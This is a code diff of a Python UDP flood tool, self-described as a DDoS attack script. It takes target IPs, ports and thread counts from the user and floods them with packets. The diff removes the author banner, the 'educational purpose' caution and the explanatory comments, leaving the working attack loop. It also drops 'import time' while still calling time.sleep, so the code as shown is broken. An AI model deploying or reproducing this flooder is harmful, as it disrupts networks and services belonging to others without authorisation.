@@ -1,23 +1,8 @@
-import os
-import time
 import socket
 import scapy.all as scapy
 import random
 import threading
-# Terminal header settings and information
-os.system('color 0A')
-print("Developer   :   KARTHIK LAL (https://karthiklal.in)")
-print("Created Date:   2023-10-12")
-print('Project     :   DDOS-Attack')
-print('Purpose     :   A simple DDOS-Attack tool to test your network security')
-print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
-print()
 
-# Date and Time Declaration and Initialization
-mydate = time.strftime('%Y-%m-%d')
-mytime = time.strftime('%H-%M')
-
-# Lets define sock and bytes for our attack
 def send_packets(ip, port, data, proxy_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sent = 0
@@ -29,14 +14,10 @@ def send_packets(ip, port, data, proxy_size):
             if port == 65534:
                 port = 1
 
-# Type your ip and port number (find IP address using nslookup or any online website)
 ips = input("IP Targets (separated by commas): ").split(',')
 ports = input("Ports (separated by commas): ").split(',')
 proxy_size = int(input("Proxy Size : "))
 threads = int(input("Number of threads : "))
-
-# Lets start the attack
-print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
 
 time.sleep(3)
 for ip in ips:
